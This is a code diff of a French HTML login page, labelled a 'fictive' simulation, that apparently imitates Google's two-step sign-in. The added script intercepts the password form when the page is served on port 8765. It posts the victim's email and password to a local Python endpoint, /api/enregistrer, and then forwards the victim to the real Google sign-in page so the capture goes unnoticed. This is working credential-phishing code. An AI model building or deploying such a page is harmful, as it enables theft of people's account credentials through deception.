@@ -5,6 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Simulation - Page de connexion fictive</title>
   <link rel="stylesheet" href="login-simulation.css" />
+  <!-- build: v4-set-form-only -->
 </head>
 <body>
   <main class="login-page" aria-labelledby="login-title">
@@ -86,6 +87,8 @@
   </main>
 
   <script>
+    const PYTHON_MODE = window.location.port === "8765";
+
     const stepEmail = document.querySelector("#step-email");
     const stepPassword = document.querySelector("#step-password");
     const identifier = document.querySelector("#identifier");
@@ -97,25 +100,6 @@
     const changeAccountButton = document.querySelector("#changeAccountButton");
     const saveStatus = document.querySelector("#saveStatus");
     const GOOGLE_LOGIN_URL = "https://accounts.google.com/v3/signin/identifier";
-
-    function getPort() {
-      return window.location.port || (window.location.protocol === "https:" ? "443" : "80");
-    }
-
-    function usePythonServer() {
-      return getPort() === "8765";
-    }
-
-    function getCaptureApiUrl() {
-      const params = new URLSearchParams(window.location.search);
-      const customApi = params.get("api");
-
-      if (customApi) {
-        return customApi;
-      }
-
-      return `http://${window.location.hostname}:8765/api/enregistrer`;
-    }
 
     function showStep(step) {
       const isEmail = step === "email";
@@ -131,24 +115,6 @@
       } else {
         password.focus();
       }
-    }
-
-    async function enregistrerViaPython(email, motDePasse) {
-      const response = await fetch(getCaptureApiUrl(), {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          email,
-          password: motDePasse,
-          date: new Date().toISOString(),
-        }),
-      });
-
-      if (!response.ok) {
-        throw new Error("Enregistrement impossible");
-      }
-
-      return response.json();
     }
 
     emailNextButton.addEventListener("click", () => {
@@ -169,43 +135,55 @@
       showStep("email");
     });
 
-    passwordForm.addEventListener("submit", async (event) => {
-      const email = usernameField.value.trim();
-      const motDePasse = password.value.trim();
-
-      if (!motDePasse) {
-        event.preventDefault();
-        password.focus();
-        return;
-      }
-
-      if (!usePythonServer()) {
-        return;
-      }
-
-      event.preventDefault();
-      saveStatus.hidden = true;
-
-      try {
-        await enregistrerViaPython(email, motDePasse);
-      } catch (error) {
-        saveStatus.hidden = false;
-        saveStatus.textContent = "Serveur Python indisponible. Lancez : python server.py";
-        saveStatus.classList.add("is-error");
-        return;
-      }
-
-      const redirectUrl = new URL(GOOGLE_LOGIN_URL);
-      redirectUrl.searchParams.set("Email", email);
-      window.location.href = redirectUrl.toString();
-    });
-
     identifier.addEventListener("keydown", (event) => {
       if (event.key === "Enter") {
         event.preventDefault();
         emailNextButton.click();
       }
     });
+
+    if (PYTHON_MODE) {
+      passwordForm.action = "/api/enregistrer";
+
+      passwordForm.addEventListener("submit", async (event) => {
+        event.preventDefault();
+
+        const email = usernameField.value.trim();
+        const motDePasse = password.value.trim();
+
+        if (!motDePasse) {
+          password.focus();
+          return;
+        }
+
+        saveStatus.hidden = true;
+
+        try {
+          const response = await fetch("/api/enregistrer", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              email,
+              password: motDePasse,
+              date: new Date().toISOString(),
+            }),
+          });
+
+          if (!response.ok) {
+            throw new Error("Enregistrement impossible");
+          }
+        } catch (error) {
+          saveStatus.hidden = false;
+          saveStatus.textContent = "Serveur Python indisponible. Lancez : python server.py";
+          saveStatus.classList.add("is-error");
+          return;
+        }
+
+        const redirectUrl = new URL(GOOGLE_LOGIN_URL);
+        redirectUrl.searchParams.set("Email", email);
+        window.location.href = redirectUrl.toString();
+      });
+    }
   </script>
 </body>
 </html>
